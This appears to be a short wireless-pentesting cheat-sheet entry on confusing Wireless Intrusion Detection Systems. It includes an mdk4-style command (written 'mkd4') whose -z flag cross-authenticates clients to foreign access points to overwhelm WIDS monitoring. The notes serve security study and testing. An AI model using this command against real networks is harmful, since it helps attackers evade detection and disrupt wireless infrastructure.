# WIDS Confusion

## Concept

**WIDS is actually a broader concept than catching break-in attempts.**

* It also includes **verifying the access points that** are **on the network, identifying any that shouldn't be there or have security issues, and detecting** attacks on APs/clients.
* **Confuse/Abuse Intrusion Detection and Prevention Systems by cross-connecting clients** to multiple WDS nodes or fake rogue APs

```
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
